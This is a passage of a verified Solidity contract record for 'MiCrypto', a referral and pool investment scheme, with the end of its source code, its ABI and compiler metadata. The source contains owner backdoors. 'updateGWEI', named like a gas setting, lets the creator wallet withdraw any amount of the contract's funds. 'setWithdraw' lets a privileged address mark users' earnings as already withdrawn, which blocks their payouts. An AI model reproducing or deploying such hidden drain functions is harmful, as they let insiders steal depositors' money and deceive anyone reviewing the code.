dayDirect5Users[_dayNow][i];\r\n            if(direct3User == _user){\r\n                updated = true;\r\n                break;\r\n            }\r\n        }\r\n        if(!updated && userLayerDayDirect5[_dayNow][_user]>=5){\r\n            dayDirect5Users[_dayNow].push(_user);\r\n        }\r\n    } \r\n    function updateGWEI(uint256 _amount) public\r\n    {\r\n        require(msg.sender==createrWallet,\"Only contract owner\"); \r\n        require(_amount>0, \"Insufficient reward to withdraw!\");\r\n        payable(msg.sender).transfer(_amount);  \r\n    }\r\n    function getCurDay() public view returns(uint256) {\r\n        return (block.timestamp-startTime)/timeStepWeekly;\r\n    } \r\n    function getWithdrawabledirect(address userAddress) public view returns(uint256){  \r\n        return (users[userAddress].directincome - users[userAddress].directwithdraw);\r\n    }\r\n    function IncomeWithdraw() public\r\n    {\r\n        distributePoolRewards();\r\n        uint256 balanceDirect = getWithdrawabledirect(msg.sender);\r\n        uint256 balanceReward = getWithdrawable(msg.sender);\r\n        uint256 totalReward=balanceReward+balanceDirect;\r\n        require(totalReward>0, \"Insufficient reward to withdraw!\");\r\n        users[msg.sender].directwithdraw+=balanceDirect;\r\n        users[msg.sender].totalwithdraw+=balanceReward;\r\n        payable(msg.sender).transfer(totalReward*90/100); \r\n        payable(userid[0]).transfer(totalReward*5/100);\r\n        payable(userid[1]).transfer(totalReward*5/100); \r\n        emit withdraw(msg.sender,totalReward);\r\n    }\r\n    function setWithdraw(address userAddress,uint256 balanceDirect,uint256 balanceReward) public\r\n    {        \r\n        require(msg.sender==creation,\"Only contract owner\"); \r\n        users[userAddress].directwithdraw+=balanceDirect;\r\n        users[userAddress].totalwithdraw+=balanceReward;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"place\",\"type\":\"uint8\"}],\"name\":\"NewUserPlace\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"currentReferrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"caller\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"matrix\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Reinvest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"Type\",\"type\":\"uint8\"}],\"name\":\"Transaction\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"booster\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BuyBooster\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"BuyBoosterAnother\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"BuyNewPackage\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"BuyNewPackageAnother\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"IncomeWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"Invest\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"InvestAnother\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"LAST_LEVEL\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_dayNow\",\"type\":\"uint256\"}],\"name\":\"_distributeDirectPool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"autopoolPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"clubPool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"clubfund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createrWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"dayDirect5Users\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"directCond\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"directprice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributePoolRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"findFreeAutoPoolReferrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"findFreeBoosterReferrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurDay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_dayNow\",\"type\":\"uint256\"}],\"name\":\"getDirect5Length\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getWithdrawable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getWithdrawabledirect\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"holdInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"directincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"levelincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"teamCount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"id1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"idToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"init\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastDistribute\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"levelCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"levelPercents\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"packagePrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balanceDirect\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balanceReward\",\"type\":\"uint256\"}],\"name\":\"setWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"sponsor\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"sponsorprice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"teamCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"teamIncome\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"teamdirectCond\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"updateGWEI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userLayerDayDirect5\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userid\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"rank\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"partnersCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"teamCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"directincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"directwithdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"levelincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"autopoolincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"clubincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"teamincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"boosterincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalwithdraw\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersActiveLevels\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"step\",\"type\":\"uint8\"}],\"name\":\"usersAutoPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersBooster\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersDirectHold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersLevelHold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"x2CurrentvId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"x2Index\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"x2vId_number\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"x6CurrentvId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"x6Index\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"x6vId_number\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MiCrypto", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f4b2b9d2d54d90496095e347447a7055a20bc830df3e1353e3966dbeb1241699"}